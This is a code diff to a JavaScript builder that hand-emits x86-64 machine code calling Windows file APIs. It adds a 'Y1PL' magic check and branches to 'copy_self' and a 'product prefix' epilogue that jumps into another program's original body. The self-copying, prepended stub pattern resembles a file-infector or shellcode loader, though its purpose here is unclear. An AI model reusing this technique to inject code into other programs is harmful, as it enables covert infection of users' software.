@@ -61,7 +61,7 @@ function build() {
   emit(0x48, 0xc7, 0x44, 0x24, 0x30, 0, 0, 0, 0);
   emit(0x41, 0xff, 0x97, ...u32(8));
   emit(0x48, 0x83, 0xf8, 0xff);
-  jcc(0x84, 'fail');
+  jcc(0x84, 'place_epi'); // no input.tyb → place / body (yoyo.ty: place_epi→fail)
   emit(0x48, 0x89, 0xc3);
 
   // ReadFile 64B probe
@@ -77,10 +77,15 @@ function build() {
   emit(0x48, 0x89, 0xd9);
   emit(0x41, 0xff, 0x97, ...u32(0x20));
 
-  // if nread > 63 → copy_self
+  // if nread <= 63 → content-aware; else Y1PL → place_epi (product→body), else copy_self
   emit(0x83, 0xff, 0x3f);
-  jcc(0x87, 'copy_self');
+  jcc(0x86, 'small'); // jbe small
 
+  emit(0x81, 0x7c, 0x24, 0x50, ...u32(0x4c503159)); // cmp [rsp+0x50], 'Y1PL'
+  jcc(0x85, 'copy_self'); // jne copy_self
+  jmp('place_epi'); // Y1PL: restore stack + leave (product retargets to body)
+
+  mark('small');
   // ---- content-aware compact (SEMHOST) ----
   leaRipR14('exp_ret');
   emit(0x41, 0xbd, ...u32(EXP.ret.length));
@@ -248,6 +253,14 @@ function build() {
   mark('fail');
   emit(0xb9, ...u32(1));
   emit(0x41, 0xff, 0x97, ...u32(0x28));
+
+  // Product prefix: CreateFile-miss / Y1PL land here; jmp retargeted to old H_00 body.
+  // In yoyo.ty alone, jmp targets fail (safe dead-end).
+  mark('place_epi');
+  emit(0x48, 0x81, 0xc4, ...u32(0x88));
+  emit(0xe9);
+  fixRel32.push({ at: parts.length, lab: 'fail' });
+  emit(0, 0, 0, 0);
 
   const locs = {};
   const addStr = (lab, s) => {
